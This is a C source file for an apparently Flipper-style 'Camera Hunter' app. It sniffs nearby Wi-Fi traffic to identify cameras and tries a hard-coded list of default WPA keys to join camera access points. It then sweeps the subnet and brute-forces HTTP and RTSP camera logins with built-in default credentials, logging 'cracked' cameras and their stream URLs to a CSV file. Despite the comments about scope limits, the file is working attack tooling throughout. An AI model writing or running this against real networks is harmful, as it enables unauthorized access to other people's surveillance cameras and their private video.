#include "cam_hunter.h"
#include "cam_auth.h"
#include "cam_classify.h"
#include "../wlan_app/wlan_hal.h"
#include "../lan_attack/net_socket.h"

#include <furi.h>
#include <string.h>
#include <stdio.h>
#include <storage/storage.h>

#include <lwip/sockets.h> // htonl/ntohl
#include <lwip/netif.h>
#include <lwip/etharp.h>
#include <lwip/ip4_addr.h>
#include <lwip/tcpip.h>

#define TAG "CamHunt"

// ---- tunables ---------------------------------------------------------------
#define CAM_MAX_HOSTS 32
#define CAM_CONNECT_TIMEOUT_MS 500 // TCP port-probe timeout
#define CAM_CRED_TIMEOUT_MS 1500 // per HTTP/RTSP auth round trip
#define CAM_SWEEP_BATCH 4
#define CAM_JOIN_TIMEOUT_MS 9000 // wait for DHCP after associating
#define CAM_AUTO_MAX_APS 6 // cap camera-AP join attempts in auto mode
#define CAM_AUDITED_RESERVED 10 // findings[] slots reserved so Detected can't evict Audited

// Camera service ports.
static const uint16_t http_ports[] = {80, 81, 88, 5000, 7001, 8000, 8080, 8090, 8181, 8899, 9000};
static const uint16_t rtsp_ports[] = {554, 8554, 10554};
static const uint16_t bin_ports[] = {34567, 34599, 37777}; // Dahua / generic DVR (info only)
static const uint16_t tls_ports[] = {443, 8443}; // HTTPS cam UI (detect only; no TLS cred test)
#define HTTP_PORT_COUNT (sizeof(http_ports) / sizeof(http_ports[0]))
#define RTSP_PORT_COUNT (sizeof(rtsp_ports) / sizeof(rtsp_ports[0]))
#define BIN_PORT_COUNT (sizeof(bin_ports) / sizeof(bin_ports[0]))
#define TLS_PORT_COUNT (sizeof(tls_ports) / sizeof(tls_ports[0]))

// Built-in default credentials (user, pass). Ordered most-common first.
typedef struct {
    const char* user;
    const char* pass;
} CredPair;
static const CredPair default_creds[] = {
    {"admin", "admin"}, {"admin", ""}, {"admin", "12345"}, {"admin", "123456"},
    {"admin", "1234"}, {"admin", "admin123"}, {"admin", "password"}, {"admin", "9999"},
    {"admin", "12345678"}, {"admin", "54321"}, {"admin", "meinsm"}, {"root", "root"},
    {"root", "12345"}, {"root", "admin"}, {"root", ""}, {"root", "pass"},
    {"root", "ivdev"}, {"supervisor", "supervisor"}, {"service", "service"},
    {"user", "user"}, {"guest", "guest"},
};
#define CRED_COUNT (sizeof(default_creds) / sizeof(default_creds[0]))

// Default WPA keys to try when a camera-like AP is encrypted (auto mode).
static const char* default_wpa_keys[] = {
    "12345678", "1234567890", "0123456789", "123456789", "88888888", "admin123",
};
#define WPA_KEY_COUNT (sizeof(default_wpa_keys) / sizeof(default_wpa_keys[0]))

typedef struct {
    uint32_t ip; // network byte order
} CamHost;

struct CamHunt {
    FuriThread* thread;
    volatile bool cancel;
    volatile bool done;

    CamHuntMode mode;
    char ssid[33];
    char pass[65];

    // live status (single writer = worker)
    volatile CamPhase phase;
    char phase_text[48];
    volatile uint16_t aps_seen;
    volatile uint16_t detected;
    volatile uint16_t hosts_alive;
    volatile uint16_t ports_open;
    volatile uint16_t creds_hit;
    volatile uint8_t progress_pct;
    uint32_t start_tick;

    // subnet sweep state (recon-style ARP harvest)
    uint32_t base_host; // host-order /24 base
    uint32_t own_ip_net; // own IP (net order) to skip
    volatile uint16_t sweep_from;
    volatile uint16_t sweep_count;
    CamHost hosts[CAM_MAX_HOSTS];
    volatile uint8_t host_count;

    // findings
    CamFinding findings[CAM_HUNT_MAX_FINDINGS];
    volatile uint8_t finding_count;

    File* csv;
    char csv_path[80];

    // on-demand single-camera audit (own-AP only)
    FuriThread* audit_thread;
    volatile bool audit_running;
    volatile bool audit_done;
    char audit_phase[48];
    CamFinding audit_target; // copy of the selected finding being audited
};

// ---- small helpers ----------------------------------------------------------

static void set_phase(CamHunt* h, CamPhase p, const char* text) {
    h->phase = p;
    if(text) {
        strncpy(h->phase_text, text, sizeof(h->phase_text) - 1);
        h->phase_text[sizeof(h->phase_text) - 1] = '\0';
    }
}

static void fmt_ip(uint32_t ip_host, char* out, size_t cap) {
    snprintf(
        out, cap, "%u.%u.%u.%u", (unsigned)((ip_host >> 24) & 0xFF),
        (unsigned)((ip_host >> 16) & 0xFF), (unsigned)((ip_host >> 8) & 0xFF),
        (unsigned)(ip_host & 0xFF));
}

static bool contains_ci(const char* hay, const char* needle) {
    size_t nl = strlen(needle);
    if(!nl) return false;
    for(const char* p = hay; *p; p++) {
        size_t i = 0;
        while(i < nl && p[i] && ((p[i] | 0x20) == (needle[i] | 0x20))) i++;
        if(i == nl) return true;
    }
    return false;
}

static bool ap_is_camera(const char* ssid) {
    return cam_ssid_looks_like_cam(ssid);
}

// Map a Server header / realm to a short vendor label.
static void vendor_label(const char* server, const char* realm, char* out, size_t cap) {
    struct {
        const char* key;
        const char* name;
    } map[] = {
        {"hikvision", "Hikvision"}, {"dahua", "Dahua"},   {"app-webs", "Dahua"},
        {"uc-httpd", "CheapCam"},   {"goahead", "GoAhead"}, {"boa", "Boa/IPCam"},
        {"hipcam", "HiPcam"},       {"jaws", "Webcam"},    {"axis", "Axis"},
        {"reolink", "Reolink"},     {"mvpower", "MVPower"}, {"webs", "IPCam"},
    };
    for(size_t i = 0; i < sizeof(map) / sizeof(map[0]); i++) {
        if((server && contains_ci(server, map[i].key)) ||
           (realm && contains_ci(realm, map[i].key))) {
            strncpy(out, map[i].name, cap - 1);
            out[cap - 1] = '\0';
            return;
        }
    }
    strncpy(out, "generic", cap - 1);
    out[cap - 1] = '\0';
}

static void csv_line(CamHunt* h, const char* line) {
    if(!h->csv) return;
    storage_file_write(h->csv, line, strlen(line));
    storage_file_write(h->csv, "\n", 1);
}

static void add_finding(
    CamHunt* h,
    const char* ip,
    const char* vendor,
    uint16_t port,
    const char* proto,
    bool cracked,
    const char* cred,
    const char* url) {
    // Dedup by ip+port.
    for(uint8_t i = 0; i < h->finding_count; i++) {
        if(h->findings[i].port == port && strcmp(h->findings[i].ip, ip) == 0) return;
    }
    // Always record to the durable CSV + cracked counter BEFORE the RAM-table cap:
    // passive Detected entries can saturate findings[], and an audited/cracked result
    // (the crown jewel) must never be silently dropped from the log or the tally.
    if(cracked) h->creds_hit++;
    {
        char line[192];
        snprintf(
            line, sizeof(line), "audited,%s,%u,%s,%s,%s,%s", ip, (unsigned)port, proto, vendor,
            cracked ? cred : "locked", url);
        csv_line(h, line);
    }
    if(h->finding_count >= CAM_HUNT_MAX_FINDINGS) return;
    CamFinding* f = &h->findings[h->finding_count];
    f->kind = CamKindAudited;
    strncpy(f->ip, ip, sizeof(f->ip) - 1);
    f->ip[sizeof(f->ip) - 1] = '\0';
    strncpy(f->vendor, vendor, sizeof(f->vendor) - 1);
    f->vendor[sizeof(f->vendor) - 1] = '\0';
    f->port = port;
    strncpy(f->proto, proto, sizeof(f->proto) - 1);
    f->proto[sizeof(f->proto) - 1] = '\0';
    f->cracked = cracked;
    strncpy(f->cred, cred, sizeof(f->cred) - 1);
    f->cred[sizeof(f->cred) - 1] = '\0';
    strncpy(f->url, url, sizeof(f->url) - 1);
    f->url[sizeof(f->url) - 1] = '\0';
    h->finding_count++;
}

// Add a "detected" finding: a possible camera seen on the air (client on a
// network, or an AP we couldn't join). Dedup by MAC.
static void add_detected(
    CamHunt* h,
    const char* mac,
    const char* vendor,
    const char* ssid,
    int8_t rssi,
    uint8_t channel,
    bool is_ap,
    uint8_t authmode) {
    for(uint8_t i = 0; i < h->finding_count; i++) {
        if(h->findings[i].kind == CamKindDetected && strcmp(h->findings[i].mac, mac) == 0) return;
    }
    // Reserve slots so passive Detected devices never fill the table and evict an
    // Audited (connected+probed) result — those still record to CSV regardless.
    if(h->finding_count >= CAM_HUNT_MAX_FINDINGS - CAM_AUDITED_RESERVED) return;
    CamFinding* f = &h->findings[h->finding_count];
    memset(f, 0, sizeof(*f));
    f->kind = CamKindDetected;
    strncpy(f->vendor, vendor ? vendor : "camera", sizeof(f->vendor) - 1);
    strncpy(f->mac, mac, sizeof(f->mac) - 1);
    if(ssid) strncpy(f->ssid, ssid, sizeof(f->ssid) - 1);
    f->rssi = rssi;
    f->channel = channel;
    f->is_ap = is_ap; // own-AP cam => auditable on demand without joining a foreign net
    f->authmode = authmode;
    h->finding_count++;
    h->detected++;

    char line[160];
    snprintf(
        line, sizeof(line), "detected,%s,%s,%s,rssi=%d,ch=%u", mac, vendor ? vendor : "",
        ssid ? ssid : "", (int)rssi, (unsigned)channel);
    csv_line(h, line);
}

// ---- promiscuous sniff (find cameras that are CLIENTS on a network) ----------
// The esp_wifi promiscuous callback has no user context, so sniffed camera-vendor
// devices land in this small global table; the worker drains it after the sniff.
#define SNIFF_MAX 96
typedef struct {
    uint8_t mac[6];
    int8_t rssi;
    uint8_t ch;
    const char* vendor; // NULL when the OUI is not a known camera maker
    uint8_t conf; // CamConf tier of the OUI (None/Low/High)
} SniffDev;
static SniffDev g_sniff[SNIFF_MAX];
static volatile uint8_t g_sniff_n;

static void sniff_note(const uint8_t* mac, int8_t rssi, uint8_t ch) {
    if(mac[0] & 0x01) return; // skip broadcast/multicast/group frames
    const char* v = cam_vendor_from_oui(mac); // NULL if OUI isn't a known cam maker
    CamConf conf = cam_oui_confidence(mac);
    for(uint8_t i = 0; i < g_sniff_n; i++) {
        if(memcmp(g_sniff[i].mac, mac, 6) == 0) {
            if(rssi > g_sniff[i].rssi) {
                g_sniff[i].rssi = rssi;
                g_sniff[i].ch = ch;
            }
            return;
        }
    }
    // Keep EVERY distinct device, not just known camera OUIs: an IP cam whose exact
    // prefix we don't list still shows up (labeled "device"), so 4 real cams appear
    // even when their OUI is unknown. If the table fills, a known camera OUI evicts
    // the weakest unknown device so cams are never crowded out by phones/laptops.
    uint8_t slot;
    if(g_sniff_n >= SNIFF_MAX) {
        if(!v) return; // full, and this is just another unknown device
        int weakest = -1;
        for(uint8_t i = 0; i < g_sniff_n; i++) {
            if(g_sniff[i].vendor == NULL &&
               (weakest < 0 || g_sniff[i].rssi < g_sniff[weakest].rssi))
                weakest = (int)i;
        }
        if(weakest < 0) return; // table is all known cams — leave it be
        slot = (uint8_t)weakest;
    } else {
        slot = g_sniff_n++;
    }
    SniffDev* d = &g_sniff[slot];
    memcpy(d->mac, mac, 6);
    d->rssi = rssi;
    d->ch = ch;
    d->vendor = v;
    d->conf = (uint8_t)conf;
}

static void sniff_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(type == WIFI_PKT_CTRL || type == WIFI_PKT_MISC) return; // no full address set
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if(len < 16) return; // need at least addr2
    const uint8_t* p = pkt->payload;
    int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;
    uint8_t ch = (uint8_t)pkt->rx_ctrl.channel;
    // 802.11 header: fc(2) dur(2) addr1(6) addr2(6) addr3(6).
    // addr2 = transmitter: an uplink data frame's SA is the client camera.
    sniff_note(p + 10, rssi, ch);
    // addr1 = receiver: a unicast downlink frame's DA is the client camera
    // (broadcast/multicast is filtered inside sniff_note).
    sniff_note(p + 4, rssi, ch);
    if(len >= 22) sniff_note(p + 16, rssi, ch); // addr3 (often BSSID / the other end)
}

static void sniff_discover(CamHunt* h) {
    set_phase(h, CamPhaseSniff, "Sniffing the air for cams");
    g_sniff_n = 0;
    wlan_hal_set_promiscuous(true, sniff_cb);
    // Idle client cameras (Ring/Wyze/Nest/Tapo/...) transmit only sporadically —
    // a keepalive every few seconds — so a quick 180ms hop across all 13 channels
    // almost never lands on the cam's channel at the instant it talks. Instead we
    // DWELL: heavily on the non-overlapping channels 1/6/11 (where virtually every
    // 2.4GHz AP, and therefore its client cams, actually sits) and only briefly
    // brush the in-between channels. ~16s total gives an idle cam several chances
    // to be heard on its home channel.
    static const uint8_t primary[] = {1, 6, 11};
    static const uint8_t others[] = {2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
    const size_t nprim = sizeof(primary) / sizeof(primary[0]);
    const size_t noth = sizeof(others) / sizeof(others[0]);
    const int rounds = 6;
    for(int r = 0; r < rounds && !h->cancel; r++) {
        for(size_t i = 0; i < nprim && !h->cancel; i++) {
            wlan_hal_set_channel(primary[i]);
            char st[48];
            snprintf(
                st, sizeof(st), "Sniff ch %u  (%u seen)", (unsigned)primary[i],
                (unsigned)g_sniff_n);
            set_phase(h, CamPhaseSniff, st);
            furi_delay_ms(600); // long dwell to catch a sporadic keepalive
        }
        for(size_t i = 0; i < noth && !h->cancel; i++) {
            wlan_hal_set_channel(others[i]);
            furi_delay_ms(80); // brief brush of the less-likely channels
        }
        h->progress_pct = (uint8_t)(((r + 1) * 22U) / rounds);
    }
    wlan_hal_set_promiscuous(false, NULL);
    // Drain sniffed devices into Detected findings, cameras FIRST: pass 0 adds
    // known camera-OUI devices, pass 1 adds the remaining unknown devices as
    // "device". Real cams thus claim the limited findings slots (and list at the
    // top) even in a home full of phones/laptops, and unknown-OUI cams still show.
    uint8_t n = g_sniff_n;
    for(int pass = 0; pass < 2 && !h->cancel; pass++) {
        for(uint8_t i = 0; i < n && !h->cancel; i++) {
            bool known = (g_sniff[i].vendor != NULL);
            if(pass == 0 && !known) continue;
            if(pass == 1 && known) continue;
            char mac[18];
            snprintf(
                mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", g_sniff[i].mac[0],
                g_sniff[i].mac[1], g_sniff[i].mac[2], g_sniff[i].mac[3], g_sniff[i].mac[4],
                g_sniff[i].mac[5]);
            add_detected(
                h, mac, known ? g_sniff[i].vendor : "device", "", g_sniff[i].rssi,
                g_sniff[i].ch, false, 0); // sniffed device = client on a net, not own-AP
        }
    }
}

// ---- lwIP ARP sweep (harvest live hosts on the /24) -------------------------

static void arp_cb(void* ctx) {
    CamHunt* h = ctx;
    struct netif* nif = netif_default;
    if(!nif) return;

    for(size_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t* ip_ret = NULL;
        struct netif* nif_ret = NULL;
        struct eth_addr* eth_ret = NULL;
        if(etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
            uint32_t ip_net = ip_ret->addr;
            if(ip_net == 0 || ip_net == h->own_ip_net) continue;
            if((ntohl(ip_net) & 0xFFFFFF00) != h->base_host) continue;
            if(h->host_count >= CAM_MAX_HOSTS) continue;
            bool dup = false;
            for(uint8_t k = 0; k < h->host_count; k++)
                if(h->hosts[k].ip == ip_net) dup = true;
            if(!dup) h->hosts[h->host_count++].ip = ip_net;
        }
    }

    for(uint16_t k = 0; k < h->sweep_count; k++) {
        uint16_t octet = (uint16_t)(h->sweep_from + k);
        if(octet < 1 || octet > 254) continue;
        ip4_addr_t target;
        target.addr = htonl(h->base_host | octet);
        if(target.addr == h->own_ip_net) continue;
        etharp_request(nif, &target);
    }
}

static void resolve_subnet(CamHunt* h) {
    uint32_t own = wlan_hal_get_own_ip(); // net order
    uint32_t mask = wlan_hal_get_netmask(); // net order
    h->own_ip_net = own;
    if(own && mask) {
        h->base_host = ntohl(own & mask) & 0xFFFFFF00;
    } else {
        h->base_host = 0;
    }
}

static void arp_sweep(CamHunt* h) {
    if(h->base_host == 0) return;
    for(uint16_t octet = 1; octet <= 254 && !h->cancel; octet += CAM_SWEEP_BATCH) {
        h->sweep_from = octet;
        h->sweep_count = CAM_SWEEP_BATCH;
        if(tcpip_callback(arp_cb, h) == ERR_OK) furi_delay_ms(20);
        h->hosts_alive = h->host_count;
        h->progress_pct = (uint8_t)((octet * 40U) / 254U);
    }
    for(int r = 0; r < 4 && !h->cancel; r++) {
        h->sweep_from = 1;
        h->sweep_count = 0;
        if(tcpip_callback(arp_cb, h) == ERR_OK) furi_delay_ms(120);
        h->hosts_alive = h->host_count;
    }
}

// ---- per-host probe + credential test ---------------------------------------

static bool port_open(uint32_t ip_host, uint16_t port) {
    NetSocket* s = net_socket_tcp_connect(ip_host, port, CAM_CONNECT_TIMEOUT_MS);
    if(!s) return false;
    net_socket_close(s);
    return true;
}

static void probe_host(CamHunt* h, uint32_t ip_host) {
    char ip[16];
    fmt_ip(ip_host, ip, sizeof(ip));
    char phase[48];
    snprintf(phase, sizeof(phase), "Probing %s", ip);
    set_phase(h, CamPhaseProbe, phase);

    // HTTP camera interfaces.
    for(size_t p = 0; p < HTTP_PORT_COUNT && !h->cancel; p++) {
        uint16_t port = http_ports[p];
        if(!port_open(ip_host, port)) continue;
        h->ports_open++;

        CamHttpInfo info;
        if(!cam_http_probe(ip_host, port, CAM_CRED_TIMEOUT_MS, &info)) continue;

        char vendor[24];
        vendor_label(info.server, info.realm, vendor, sizeof(vendor));
        char url[80];
        snprintf(url, sizeof(url), "http://%s:%u/", ip, (unsigned)port);

        if(info.auth == CamAuthNone) {
            add_finding(h, ip, vendor, port, "HTTP", true, "open (no auth)", url);
            continue;
        }

        bool cracked = false;
        for(size_t c = 0; c < CRED_COUNT && !h->cancel; c++) {
            char st[48];
            snprintf(
                st, sizeof(st), "%s :%u %s/%s", ip, (unsigned)port, default_creds[c].user,
                default_creds[c].pass[0] ? default_creds[c].pass : "-");
            set_phase(h, CamPhaseProbe, st);
            if(cam_http_try_cred(
                   ip_host, port, default_creds[c].user, default_creds[c].pass,
                   CAM_CRED_TIMEOUT_MS)) {
                char cred[40];
                snprintf(cred, sizeof(cred), "%s:%s", default_creds[c].user, default_creds[c].pass);
                add_finding(h, ip, vendor, port, "HTTP", true, cred, url);
                cracked = true;
                break;
            }
        }
        if(!cracked) add_finding(h, ip, vendor, port, "HTTP", false, "locked", url);
    }

    // RTSP streams.
    for(size_t p = 0; p < RTSP_PORT_COUNT && !h->cancel; p++) {
        uint16_t port = rtsp_ports[p];
        if(!port_open(ip_host, port)) continue;
        h->ports_open++;

        char url[80];
        bool cracked = false;
        for(size_t c = 0; c < CRED_COUNT && !h->cancel; c++) {
            char st[48];
            snprintf(st, sizeof(st), "%s :%u rtsp %s", ip, (unsigned)port, default_creds[c].user);
            set_phase(h, CamPhaseProbe, st);
            if(cam_rtsp_try_cred(
                   ip_host, port, default_creds[c].user, default_creds[c].pass,
                   CAM_CRED_TIMEOUT_MS, url, sizeof(url))) {
                char cred[40];
                if(default_creds[c].user[0] == '\0')
                    snprintf(cred, sizeof(cred), "open (no auth)");
                else
                    snprintf(
                        cred, sizeof(cred), "%s:%s", default_creds[c].user, default_creds[c].pass);
                add_finding(h, ip, "RTSP", port, "RTSP", true, cred, url);
                cracked = true;
                break;
            }
        }
        if(!cracked) {
            snprintf(url, sizeof(url), "rtsp://%s:%u/", ip, (unsigned)port);
            add_finding(h, ip, "RTSP", port, "RTSP", false, "locked", url);
        }
    }

    // Binary DVR ports (info only — no default-cred path over HTTP/RTSP).
    for(size_t p = 0; p < BIN_PORT_COUNT && !h->cancel; p++) {
        uint16_t port = bin_ports[p];
        if(!port_open(ip_host, port)) continue;
        h->ports_open++;
        char url[80];
        snprintf(url, sizeof(url), "%s:%u", ip, (unsigned)port);
        add_finding(h, ip, "DVR", port, "TCP", false, "open port", url);
    }

    // HTTPS camera UIs: detect only — no TLS stack here, so no default-cred test.
    for(size_t p = 0; p < TLS_PORT_COUNT && !h->cancel; p++) {
        uint16_t port = tls_ports[p];
        if(!port_open(ip_host, port)) continue;
        h->ports_open++;
        char url[80];
        snprintf(url, sizeof(url), "https://%s:%u/", ip, (unsigned)port);
        add_finding(h, ip, "HTTPS", port, "TLS", false, "open (no TLS cred test)", url);
    }
}

static void sweep_and_probe(CamHunt* h) {
    resolve_subnet(h);
    set_phase(h, CamPhaseSweep, "Sweeping subnet");
    arp_sweep(h);

    uint8_t n = h->host_count;
    for(uint8_t i = 0; i < n && !h->cancel; i++) {
        probe_host(h, ntohl(h->hosts[i].ip));
        h->progress_pct = (uint8_t)(40U + ((uint32_t)(i + 1) * 55U) / (n ? n : 1));
    }
    // Also always probe the gateway (camera-own-AP mode: cam is usually .1).
    if(!h->cancel) {
        uint32_t gw_net = wlan_hal_get_gw_ip(); // network byte order
        if(gw_net) {
            bool known = false;
            for(uint8_t i = 0; i < h->host_count; i++)
                if(h->hosts[i].ip == gw_net) known = true;
            if(!known) probe_host(h, ntohl(gw_net));
        }
    }
}

// Associate + wait for DHCP. Returns true once we have an IP.
static bool connect_wait(
    CamHunt* h,
    const char* ssid,
    const char* pass,
    const uint8_t* bssid,
    uint8_t channel) {
    if(!wlan_hal_connect(ssid, pass, bssid, channel)) return false;
    uint32_t deadline = furi_get_tick() + furi_ms_to_ticks(CAM_JOIN_TIMEOUT_MS);
    while(furi_get_tick() < deadline && !h->cancel) {
        if(wlan_hal_is_connected() && wlan_hal_get_own_ip() != 0) return true;
        furi_delay_ms(200);
    }
    return false;
}

// ---- worker -----------------------------------------------------------------

static void hunt_auto_mode(CamHunt* h) {
    set_phase(h, CamPhaseScan, "Scanning APs for cameras");
    wifi_ap_record_t* recs = NULL;
    uint16_t count = 0;
    wlan_hal_scan(&recs, &count, 40);

    uint8_t tried = 0;
    for(uint16_t i = 0; i < count && !h->cancel; i++) {
        const char* ssid = (const char*)recs[i].ssid;
        const char* oui_vendor = cam_vendor_from_oui(recs[i].bssid);
        CamConf oui_conf = cam_oui_confidence(recs[i].bssid);
        bool ssid_cam = (ssid[0] != '\0' && ap_is_camera(ssid));
        // A camera AP by SSID keyword OR by the BSSID belonging to a camera maker.
        bool cammy = ssid_cam || (oui_vendor != NULL);
        if(!cammy) continue;
        h->aps_seen++;

        // ACTIVE-attack gate: only run the default-key / join attempt against a STRONG
        // camera match — a camera-specific vendor OUI, or an unmistakably camera-ish SSID.
        // A low-confidence OUI alone (Netgear/TP-Link/D-Link/Ubiquiti/Amazon/Nest/Tuya/
        // ESP32 — vendors that also make ordinary routers/hubs/IoT) is DETECT-ONLY, so we
        // never brute-force default WPA keys against a normal router just from its prefix.
        bool strong_cam = ssid_cam || (oui_conf == CamConfHigh);

        bool joined = false;
        // Only OWN-AP cams are reachable; try to connect to the CAM (not a network).
        if(strong_cam && tried < CAM_AUTO_MAX_APS) {
            if(recs[i].authmode == WIFI_AUTH_OPEN) {
                char st[48];
                snprintf(st, sizeof(st), "Joining %s", ssid);
                set_phase(h, CamPhaseJoin, st);
                joined = connect_wait(h, ssid, "", recs[i].bssid, recs[i].primary);
            } else {
                for(size_t k = 0; k < WPA_KEY_COUNT && !joined && !h->cancel; k++) {
                    char st[48];
                    snprintf(st, sizeof(st), "Try key %s", default_wpa_keys[k]);
                    set_phase(h, CamPhaseJoin, st);
                    joined =
                        connect_wait(h, ssid, default_wpa_keys[k], recs[i].bssid, recs[i].primary);
                    if(!joined) wlan_hal_disconnect();
                }
            }
            tried++;
        }

        if(joined) {
            // Reset per-subnet host table before sweeping this AP's LAN.
            h->host_count = 0;
            sweep_and_probe(h);
            wlan_hal_disconnect();
        } else {
            // A camera AP we couldn't get onto (protected / over cap): report it.
            char mac[18];
            snprintf(
                mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x", recs[i].bssid[0],
                recs[i].bssid[1], recs[i].bssid[2], recs[i].bssid[3], recs[i].bssid[4],
                recs[i].bssid[5]);
            add_detected(
                h, mac, oui_vendor ? oui_vendor : "camera-AP", ssid, (int8_t)recs[i].rssi,
                recs[i].primary, true, (uint8_t)recs[i].authmode); // its OWN AP => auditable
        }
    }
    if(recs) free(recs);
}

static int32_t hunt_worker(void* arg) {
    CamHunt* h = arg;
    h->start_tick = furi_get_tick();

    set_phase(h, CamPhaseWifi, "Starting Wi-Fi");
    wlan_hal_release_bt(); // reclaim BLE RAM (radios are mutually exclusive)
    if(!wlan_hal_start()) {
        set_phase(h, CamPhaseDone, "Wi-Fi init failed");
        h->progress_pct = 100;
        h->done = true;
        return 0;
    }

    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, "/ext/camera_hunter");
    snprintf(
        h->csv_path, sizeof(h->csv_path), "/ext/camera_hunter/cams_%lu.csv",
        (unsigned long)furi_get_tick());
    h->csv = storage_file_alloc(storage);
    if(!storage_file_open(h->csv, h->csv_path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_free(h->csv);
        h->csv = NULL;
    }
    csv_line(h, "kind,ident,port/vendor,proto,cred/rssi,url/ch");
    UNUSED(h->mode); // no network-join mode any more — always scan the air

    // 1) Passive sniff: find cameras that are CLIENTS on a network (by MAC vendor).
    sniff_discover(h);
    // 2) AP scan + connect to own-AP cams + audit; report the rest as detected.
    if(!h->cancel) hunt_auto_mode(h);

    if(h->csv) {
        storage_file_close(h->csv);
        storage_file_free(h->csv);
        h->csv = NULL;
    }
    furi_record_close(RECORD_STORAGE);

    wlan_hal_stop();
    h->progress_pct = 100;
    set_phase(h, CamPhaseDone, "Done");
    h->done = true;
    FURI_LOG_I(TAG, "hunt done: %u findings, %u cracked", h->finding_count, h->creds_hit);
    return 0;
}

// ---- public API -------------------------------------------------------------

CamHunt* cam_hunt_start(CamHuntMode mode, const char* ssid, const char* pass) {
    CamHunt* h = malloc(sizeof(CamHunt));
    memset(h, 0, sizeof(CamHunt));
    h->mode = mode;
    if(ssid) {
        strncpy(h->ssid, ssid, sizeof(h->ssid) - 1);
    }
    if(pass) {
        strncpy(h->pass, pass, sizeof(h->pass) - 1);
    }
    set_phase(h, CamPhaseInit, "Starting");

    h->thread = furi_thread_alloc_ex("CamHunt", 8192, hunt_worker, h);
    furi_thread_start(h->thread);
    return h;
}

bool cam_hunt_is_done(CamHunt* h) {
    return h ? h->done : true;
}

CamHuntStatus cam_hunt_status(CamHunt* h) {
    CamHuntStatus s;
    memset(&s, 0, sizeof(s));
    if(!h) return s;
    s.phase = h->phase;
    strncpy(s.phase_text, h->phase_text, sizeof(s.phase_text) - 1);
    s.aps_seen = h->aps_seen;
    s.detected = h->detected;
    s.hosts_alive = h->hosts_alive;
    s.ports_open = h->ports_open;
    s.creds_hit = h->creds_hit;
    s.progress_pct = h->progress_pct;
    s.elapsed_sec = (furi_get_tick() - h->start_tick) / furi_kernel_get_tick_frequency();
    s.done = h->done;
    return s;
}

uint8_t cam_hunt_finding_count(CamHunt* h) {
    return h ? h->finding_count : 0;
}

const CamFinding* cam_hunt_finding(CamHunt* h, uint8_t idx) {
    if(!h || idx >= h->finding_count) return NULL;
    return &h->findings[idx];
}

const char* cam_hunt_csv_path(CamHunt* h) {
    return h ? h->csv_path : "";
}

void cam_hunt_cancel(CamHunt* h) {
    if(h) h->cancel = true;
}

// ---- on-demand single-camera audit (OWN-AP only; never joins a foreign network) ----
static int32_t cam_audit_worker(void* arg) {
    CamHunt* h = arg;
    CamFinding* f = &h->audit_target;

    strncpy(h->audit_phase, "Starting Wi-Fi", sizeof(h->audit_phase) - 1);
    wlan_hal_release_bt();
    if(!wlan_hal_start()) {
        strncpy(h->audit_phase, "Wi-Fi init failed", sizeof(h->audit_phase) - 1);
        h->audit_done = true;
        h->audit_running = false;
        return 0;
    }

    // Connect to the CAMERA'S OWN AP (open, else default-WPA). is_ap findings are the
    // camera's own hotspot — this never associates with the operator's network.
    bool joined = false;
    if(f->authmode == WIFI_AUTH_OPEN) {
        snprintf(h->audit_phase, sizeof(h->audit_phase), "Joining %s", f->ssid);
        joined = connect_wait(h, f->ssid, "", NULL, f->channel);
    } else {
        for(size_t k = 0; k < WPA_KEY_COUNT && !joined && !h->cancel; k++) {
            snprintf(h->audit_phase, sizeof(h->audit_phase), "Key %s", default_wpa_keys[k]);
            joined = connect_wait(h, f->ssid, default_wpa_keys[k], NULL, f->channel);
            if(!joined) wlan_hal_disconnect();
        }
    }

    if(!joined) {
        strncpy(h->audit_phase, "Couldn't join cam AP", sizeof(h->audit_phase) - 1);
        wlan_hal_stop();
        h->audit_done = true;
        h->audit_running = false;
        return 0;
    }

    // An own-AP camera IS the gateway on its hotspot — probe it. probe_host appends
    // its open ports + HTTP/RTSP default-credential results to the findings table.
    strncpy(h->audit_phase, "Probing camera", sizeof(h->audit_phase) - 1);
    uint32_t gw = wlan_hal_get_gw_ip(); // network order
    if(gw) {
        probe_host(h, ntohl(gw));
    } else {
        uint32_t own = wlan_hal_get_own_ip();
        if(own) probe_host(h, (ntohl(own) & 0xFFFFFF00u) | 1u); // fallback: our /24 .1
    }

    wlan_hal_disconnect();
    wlan_hal_stop();
    strncpy(h->audit_phase, "Audit complete", sizeof(h->audit_phase) - 1);
    h->audit_done = true;
    h->audit_running = false;
    return 0;
}

bool cam_audit_start(CamHunt* h, uint8_t finding_idx) {
    if(!h || finding_idx >= h->finding_count) return false;
    if(h->audit_running) return false;
    CamFinding* f = &h->findings[finding_idx];
    // No-join scope: only a camera that broadcasts its OWN AP (with an SSID) is
    // auditable without joining a foreign network. Client cams stay detect-only.
    if(f->kind != CamKindDetected || !f->is_ap || f->ssid[0] == '\0') return false;
    h->audit_target = *f;
    h->audit_done = false;
    h->cancel = false;
    h->audit_running = true;
    strncpy(h->audit_phase, "Starting", sizeof(h->audit_phase) - 1);
    h->audit_thread = furi_thread_alloc_ex("CamAudit", 8192, cam_audit_worker, h);
    furi_thread_start(h->audit_thread);
    return true;
}

bool cam_audit_running(CamHunt* h) {
    return h ? h->audit_running : false;
}

bool cam_audit_done(CamHunt* h) {
    return h ? h->audit_done : true;
}

const char* cam_audit_phase(CamHunt* h) {
    return h ? h->audit_phase : "";
}

void cam_audit_join(CamHunt* h) {
    if(h && h->audit_thread) {
        furi_thread_join(h->audit_thread);
        furi_thread_free(h->audit_thread);
        h->audit_thread = NULL;
        h->audit_running = false;
    }
}

void cam_hunt_free(CamHunt* h) {
    if(!h) return;
    h->cancel = true;
    if(h->thread) {
        furi_thread_join(h->thread);
        furi_thread_free(h->thread);
    }
    if(h->audit_thread) {
        furi_thread_join(h->audit_thread);
        furi_thread_free(h->audit_thread);
    }
    free(h);
}
